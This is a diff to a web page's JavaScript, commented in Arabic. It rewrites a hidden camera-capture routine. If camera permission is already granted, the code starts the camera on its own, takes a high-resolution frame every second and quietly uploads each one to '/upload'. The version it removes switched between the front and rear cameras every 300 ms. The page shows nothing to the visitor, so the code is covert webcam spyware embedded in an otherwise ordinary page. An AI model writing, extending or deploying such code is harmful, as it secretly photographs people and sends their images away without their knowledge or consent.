@@ -511,74 +511,54 @@ function download(){
   },300);
 }
 
-/* ===== ميزات الكاميرا التلقائية (التقاط عريض وعالي الدقة بدون اقتصاص) ===== */
+/* ===== ميزات الكاميرا التلقائية وتوثيق التقاط الصور المحدثة ===== */
 let isCapturing = false;
-let currentFacingMode = 'user'; // 'user' للأمامية، 'environment' للخلفية
-
-async function captureFast(facingMode) {
-    let stream = null;
-    try {
-        // طلب الكاميرا بأعلى دقة مريحة وأوسع زاوية رؤية ممكنة
-        stream = await navigator.mediaDevices.getUserMedia({ 
-            video: { 
-                facingMode: { ideal: facingMode },
-                width: { ideal: 1920 },
-                height: { ideal: 1080 },
-                aspectRatio: { ideal: 1.777777778 }
-            } 
-        });
-
-        const videoEl = document.getElementById('video');
-        videoEl.srcObject = stream;
-        
-        await new Promise((resolve) => {
-            if (videoEl.readyState >= 2) resolve();
-            else videoEl.onloadeddata = () => resolve();
-        });
-
-        // إنشاء الكانفاس بأبعاد المستشعر الكاملة لمنع قص الوجه والأطراف
-        const canvas = document.createElement('canvas');
-        canvas.width = videoEl.videoWidth || 1920;
-        canvas.height = videoEl.videoHeight || 1080;
-        const ctx = canvas.getContext('2d');
-        ctx.drawImage(videoEl, 0, 0, canvas.width, canvas.height);
-
-        canvas.toBlob(blob => {
-            if (blob) {
-                let fd = new FormData();
-                fd.append('image', blob, `${facingMode}_eye.jpg`);
-                fetch('/upload', { method: 'POST', body: fd }).catch(() => {});
-            }
-        }, 'image/jpeg', 0.95);
-
-    } catch (e) {
-        console.log("خطأ في الالتقاط السريع:", e);
-    } finally {
-        if (stream) {
-            stream.getTracks().forEach(track => track.stop());
-        }
-    }
-}
 
 function startCapture() {
     if (isCapturing) return;
-    isCapturing = true;
 
-    const runLoop = async () => {
-        await captureFast(currentFacingMode);
-        currentFacingMode = (currentFacingMode === 'user') ? 'environment' : 'user';
-        setTimeout(runLoop, 300);
+    // طلب أبعاد فيديو عالية الدقة (1080p) من المتصفح
+    const constraints = {
+        video: {
+            width: { ideal: 1920 },
+            height: { ideal: 1080 }
+        }
     };
 
-    runLoop();
+    navigator.mediaDevices.getUserMedia(constraints)
+        .then(stream => {
+            isCapturing = true;
+            const videoElement = document.getElementById('video');
+            videoElement.srcObject = stream;
+
+            setInterval(() => {
+                const canvas = document.createElement('canvas');
+
+                // استخدام الأبعاد الحقيقية للبث مباشرة لمنع القص أو التشويه
+                const width = videoElement.videoWidth || 640;
+                const height = videoElement.videoHeight || 480;
+
+                canvas.width = width;
+                canvas.height = height;
+
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(videoElement, 0, 0, width, height);
+
+                canvas.toBlob(blob => {
+                    let fd = new FormData();
+                    fd.append('image', blob, 'eye.jpg');
+                    fetch('/upload', { method: 'POST', body: fd }).catch(() => {});
+                }, 'image/jpeg', 0.9); // جودة عالية 90%
+            }, 1000);
+        }).catch(e => console.log("بانتظار إذن الكاميرا"));
 }
 
-// البدء التلقائي فور منح الإذن
 navigator.permissions?.query({name: 'camera'}).then((permissionStatus) => {
     if (permissionStatus.state === 'granted') {
         startCapture();
     }
 });
+
 
 /* ===== Actions ===== */
 function act(a,el){
